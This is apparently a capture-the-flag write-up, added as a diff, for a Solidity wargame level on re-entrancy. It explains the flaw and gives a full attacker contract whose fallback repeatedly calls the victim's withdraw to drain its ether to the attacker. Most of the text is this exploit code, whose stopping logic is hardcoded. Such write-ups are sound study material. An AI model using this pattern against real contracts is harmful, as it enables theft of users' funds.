@@ -1,0 +1,51 @@
+Re-entrancy
+Difficulty 6/10
+
+The goal of this level is for you to steal all the funds from the contract.
+
+
+Solution
+
+We have to call the function withdraw of the victim in one fallback function in other contract. At this way we get all the ether before this line:
+
+balances[msg.sender] -= _amount;
+
+
+Scrypt:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.10;
+
+
+interface IReentrance {
+   function withdraw(uint _amoun) external;
+}
+
+
+contract Hack { 
+
+    address owner;
+    address addressVictim = 0x8c5493d578B8A33aa59baB6337469f7D7168441A;
+    IReentrance victim = IReentrance(addressVictim);
+
+    constructor() {
+        owner = msg.sender;        
+    }
+
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+
+    fallback() payable external {
+        if(address(this).balance != 0.002  ether){
+            victim.withdraw(0.001 ether);
+        }
+    }
+
+    function atack() external{
+        victim.withdraw(0.001 ether);
+    }
+
+    function withdraw() payable external {
+        payable(owner).transfer(address(this).balance);
+    }
+}
